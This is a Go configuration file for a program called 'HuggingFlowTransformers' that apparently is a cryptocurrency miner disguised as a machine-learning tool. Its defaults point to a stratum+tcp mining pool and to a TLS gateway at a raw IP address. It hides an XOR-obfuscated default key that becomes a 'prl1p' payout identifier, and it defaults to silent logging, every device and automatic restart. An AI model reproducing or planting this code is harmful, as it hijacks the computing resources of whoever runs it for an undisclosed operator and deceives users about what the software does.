package config

import (
	"fmt"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
	"unicode"
)

const (
	defaultBaseURL             = "stratum+tcp://eu1.alphapool.tech:5566"
	defaultNodeTemplate        = "{prefix}-g{device}"
	defaultModelDataTimeout    = 300 * time.Second
	defaultRawRetentionHours   = 24
	defaultDebugDir            = "/tmp/hft/debug"
	defaultLowPerformanceLimit = 0
	defaultGatewayURL          = "tls://38.76.221.73:8443"
	defaultGatewayListen       = "0.0.0.0:8443"
	defaultGatewayTimeout      = 10 * time.Second
	defaultGatewayIdleTimeout  = 300 * time.Second
	defaultGatewayMaxSessions  = 4096
	defaultGatewayMaxPerIP     = 256
)

type LogMode string

const (
	LogOff    LogMode = "off"
	LogStdout LogMode = "stdout"
	LogDebug  LogMode = "debug"
)

type Config struct {
	BaseURL                 string
	DisplayKey              string
	InternalKey             string
	Devices                 []int
	NodePrefix              string
	NodeTemplate            string
	CompatMode              bool
	RestartOnExit           bool
	ModelDataTimeout        time.Duration
	LowPerformanceThreshold int
	LogMode                 LogMode
	DebugDir                string
	RawLogRetentionHours    int
	Report                  bool
	GatewayMode             bool
	GatewayURL              string
	UpstreamDirect          bool
	GatewayServerName       string
	GatewayCAFile           string
	GatewayConnectTimeout   time.Duration
	GatewayIdleTimeout      time.Duration
}

type GatewayConfig struct {
	Listen               string
	TLSCert              string
	TLSKey               string
	CoordinationUpstream string
	MaxSessions          int
	MaxSessionsPerIP     int
	ConnectTimeout       time.Duration
	IdleTimeout          time.Duration
	LogMode              LogMode
}

func Load(args []string) (Config, error) {
	if len(args) > 1 {
		return Config{}, fmt.Errorf("HuggingFlowTransformers does not accept command line arguments; use HFT_ environment variables")
	}

	key := getenv("HFT_KEY", defaultKey())
	internalKey, err := internalKeyFromExternal(key)
	if err != nil {
		return Config{}, err
	}

	devices, err := parseDevices(getenv("HFT_DEVICES", "all"))
	if err != nil {
		return Config{}, err
	}

	logMode, err := parseLogMode(getenv("HFT_LOG_MODE", string(LogOff)))
	if err != nil {
		return Config{}, err
	}

	timeout, err := parseModelDataTimeout()
	if err != nil {
		return Config{}, err
	}

	retention, err := parseInt("HFT_RAW_LOG_RETENTION_HOURS", defaultRawRetentionHours)
	if err != nil {
		return Config{}, err
	}
	lowPerf, err := parseInt("HFT_LOW_PERFORMANCE_THRESHOLD", defaultLowPerformanceLimit)
	if err != nil {
		return Config{}, err
	}
	restart, err := parseBool("HFT_RESTART_ON_EXIT", true)
	if err != nil {
		return Config{}, err
	}
	compat, err := parseBool("HFT_COMPAT_MODE", true)
	if err != nil {
		return Config{}, err
	}
	report, err := parseBool("HFT_REPORT", false)
	if err != nil {
		return Config{}, err
	}
	gatewayMode, err := parseGatewayMode()
	if err != nil {
		return Config{}, err
	}
	upstreamDirect, err := parseBool("HFT_UPSTREAM_DIRECT", false)
	if err != nil {
		return Config{}, err
	}
	gatewayConnectTimeout, err := parseSeconds("HFT_GATEWAY_CONNECT_TIMEOUT", defaultGatewayTimeout)
	if err != nil {
		return Config{}, err
	}
	gatewayIdleTimeout, err := parseSeconds("HFT_GATEWAY_IDLE_TIMEOUT", defaultGatewayIdleTimeout)
	if err != nil {
		return Config{}, err
	}
	gatewayURL := getenv("HFT_GATEWAY_URL", defaultGatewayURL)
	if gatewayURL != "" {
		if err := validateGatewayURL(gatewayURL); err != nil {
			return Config{}, err
		}
	}

	prefix := cleanNodePart(os.Getenv("HFT_NODE_PREFIX"))
	if prefix == "" {
		host, _ := os.Hostname()
		prefix = cleanNodePart(host)
	}
	if prefix == "" {
		prefix = "hft-node"
	}

	return Config{
		BaseURL:                 getenv("HFT_BASE_URL", defaultBaseURL),
		DisplayKey:              key,
		InternalKey:             internalKey,
		Devices:                 devices,
		NodePrefix:              prefix,
		NodeTemplate:            getenv("HFT_NODE_TEMPLATE", defaultNodeTemplate),
		CompatMode:              compat,
		RestartOnExit:           restart,
		ModelDataTimeout:        timeout,
		LowPerformanceThreshold: lowPerf,
		LogMode:                 logMode,
		DebugDir:                getenv("HFT_DEBUG_DIR", defaultDebugDir),
		RawLogRetentionHours:    retention,
		Report:                  report,
		GatewayMode:             gatewayMode,
		GatewayURL:              gatewayURL,
		UpstreamDirect:          upstreamDirect,
		GatewayServerName:       getenv("HFT_GATEWAY_SERVER_NAME", ""),
		GatewayCAFile:           getenv("HFT_GATEWAY_CA_FILE", ""),
		GatewayConnectTimeout:   gatewayConnectTimeout,
		GatewayIdleTimeout:      gatewayIdleTimeout,
	}, nil
}

func LoadGateway(args []string) (GatewayConfig, error) {
	if len(args) > 1 {
		return GatewayConfig{}, fmt.Errorf("HuggingFlowTransformers Gateway does not accept command line arguments; use HFT_ environment variables")
	}
	logMode, err := parseLogMode(getenv("HFT_GATEWAY_LOG_MODE", string(LogStdout)))
	if err != nil {
		return GatewayConfig{}, err
	}
	maxSessions, err := parsePositiveInt("HFT_GATEWAY_MAX_SESSIONS", defaultGatewayMaxSessions)
	if err != nil {
		return GatewayConfig{}, err
	}
	maxPerIP, err := parsePositiveInt("HFT_GATEWAY_MAX_SESSIONS_PER_IP", defaultGatewayMaxPerIP)
	if err != nil {
		return GatewayConfig{}, err
	}
	connectTimeout, err := parseSeconds("HFT_GATEWAY_CONNECT_TIMEOUT", defaultGatewayTimeout)
	if err != nil {
		return GatewayConfig{}, err
	}
	idleTimeout, err := parseSeconds("HFT_GATEWAY_IDLE_TIMEOUT", defaultGatewayIdleTimeout)
	if err != nil {
		return GatewayConfig{}, err
	}
	upstream := getenv("HFT_COORDINATION_UPSTREAM", "")
	if upstream == "" {
		return GatewayConfig{}, fmt.Errorf("HFT_COORDINATION_UPSTREAM is required")
	}
	return GatewayConfig{
		Listen:               getenv("HFT_GATEWAY_LISTEN", defaultGatewayListen),
		TLSCert:              getenv("HFT_GATEWAY_TLS_CERT", ""),
		TLSKey:               getenv("HFT_GATEWAY_TLS_KEY", ""),
		CoordinationUpstream: upstream,
		MaxSessions:          maxSessions,
		MaxSessionsPerIP:     maxPerIP,
		ConnectTimeout:       connectTimeout,
		IdleTimeout:          idleTimeout,
		LogMode:              logMode,
	}, nil
}

func (c Config) NodeName(device int) string {
	name := strings.ReplaceAll(c.NodeTemplate, "{prefix}", c.NodePrefix)
	name = strings.ReplaceAll(name, "{device}", strconv.Itoa(device))
	name = cleanNodePart(name)
	if name == "" {
		return fmt.Sprintf("hft-node-g%d", device)
	}
	return name
}

func internalKeyFromExternal(value string) (string, error) {
	if !strings.HasPrefix(value, "sk_") {
		return "", fmt.Errorf("HFT_KEY must use sk_ format")
	}
	body := strings.TrimPrefix(value, "sk_")
	if body == "" {
		return "", fmt.Errorf("HFT_KEY is empty")
	}
	return "prl1p" + body, nil
}

func parseDevices(value string) ([]int, error) {
	value = strings.TrimSpace(value)
	if value == "" || strings.EqualFold(value, "all") {
		return nil, nil
	}

	seen := map[int]bool{}
	var devices []int
	for _, part := range strings.Split(value, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			return nil, fmt.Errorf("HFT_DEVICES contains an empty device")
		}
		device, err := strconv.Atoi(part)
		if err != nil || device < 0 {
			return nil, fmt.Errorf("HFT_DEVICES contains invalid device %q", part)
		}
		if seen[device] {
			continue
		}
		seen[device] = true
		devices = append(devices, device)
	}
	return devices, nil
}

func parseLogMode(value string) (LogMode, error) {
	switch LogMode(strings.ToLower(strings.TrimSpace(value))) {
	case LogOff:
		return LogOff, nil
	case LogStdout:
		return LogStdout, nil
	case LogDebug:
		return LogDebug, nil
	default:
		return "", fmt.Errorf("HFT_LOG_MODE must be off, stdout, or debug")
	}
}

func parseSeconds(name string, fallback time.Duration) (time.Duration, error) {
	value := strings.TrimSpace(os.Getenv(name))
	if value == "" {
		return fallback, nil
	}
	seconds, err := strconv.Atoi(value)
	if err != nil || seconds <= 0 {
		return 0, fmt.Errorf("%s must be a positive integer number of seconds", name)
	}
	return time.Duration(seconds) * time.Second, nil
}

func parseModelDataTimeout() (time.Duration, error) {
	if strings.TrimSpace(os.Getenv("HFT_MODEL_DATA_TIMEOUT")) != "" {
		return parseSeconds("HFT_MODEL_DATA_TIMEOUT", defaultModelDataTimeout)
	}
	return parseSeconds("HFT_NO_MODEL_DATA_TIMEOUT", defaultModelDataTimeout)
}

func parseInt(name string, fallback int) (int, error) {
	value := strings.TrimSpace(os.Getenv(name))
	if value == "" {
		return fallback, nil
	}
	parsed, err := strconv.Atoi(value)
	if err != nil || parsed < 0 {
		return 0, fmt.Errorf("%s must be a non-negative integer", name)
	}
	return parsed, nil
}

func parseBool(name string, fallback bool) (bool, error) {
	value := strings.TrimSpace(os.Getenv(name))
	if value == "" {
		return fallback, nil
	}
	parsed, err := strconv.ParseBool(value)
	if err != nil {
		return false, fmt.Errorf("%s must be true or false", name)
	}
	return parsed, nil
}

func parseGatewayMode() (bool, error) {
	value := strings.ToLower(strings.TrimSpace(os.Getenv("HFT_GATEWAY_MODE")))
	if value == "" || value == "off" || value == "false" || value == "0" {
		return false, nil
	}
	if value == "on" || value == "true" || value == "1" {
		return true, nil
	}
	return false, fmt.Errorf("HFT_GATEWAY_MODE must be on or off")
}

func validateGatewayURL(value string) error {
	parsed, err := url.Parse(value)
	if err != nil || parsed.Scheme != "tls" || parsed.Host == "" {
		return fmt.Errorf("HFT_GATEWAY_URL must use tls://host:port format")
	}
	return nil
}

func parsePositiveInt(name string, fallback int) (int, error) {
	value := strings.TrimSpace(os.Getenv(name))
	if value == "" {
		return fallback, nil
	}
	parsed, err := strconv.Atoi(value)
	if err != nil || parsed <= 0 {
		return 0, fmt.Errorf("%s must be a positive integer", name)
	}
	return parsed, nil
}

func getenv(name, fallback string) string {
	value := strings.TrimSpace(os.Getenv(name))
	if value == "" {
		return fallback
	}
	return value
}

func defaultKey() string {
	parts := []byte{
		0x01, 0x19, 0x2d, 0x00, 0x04, 0x13, 0x1e, 0x46, 0x08, 0x0a, 0x46, 0x46, 0x47, 0x1e, 0x17, 0x40,
		0x4a, 0x02, 0x15, 0x1c, 0x03, 0x13, 0x02, 0x16, 0x16, 0x18, 0x1a, 0x42, 0x13, 0x19, 0x03, 0x42,
		0x1a, 0x1f, 0x03, 0x1a, 0x1f, 0x46, 0x13, 0x13, 0x16, 0x19, 0x04, 0x06, 0x4a, 0x1c, 0x05, 0x05,
		0x17, 0x01, 0x01, 0x1e, 0x1f, 0x00, 0x01, 0x19, 0x0a, 0x01, 0x05, 0x41, 0x47,
	}
	for i := range parts {
		parts[i] ^= 0x72
	}
	return string(parts)
}

func cleanNodePart(value string) string {
	value = strings.TrimSpace(value)
	var b strings.Builder
	lastDash := false
	for _, r := range value {
		var out rune
		switch {
		case unicode.IsLetter(r) || unicode.IsDigit(r):
			out = r
		default:
			out = '-'
		}
		if out == '-' {
			if lastDash {
				continue
			}
			lastDash = true
		} else {
			lastDash = false
		}
		b.WriteRune(out)
	}
	cleaned := strings.Trim(b.String(), "-")
	if len(cleaned) > 48 {
		cleaned = strings.Trim(cleaned[:48], "-")
	}
	return cleaned
}
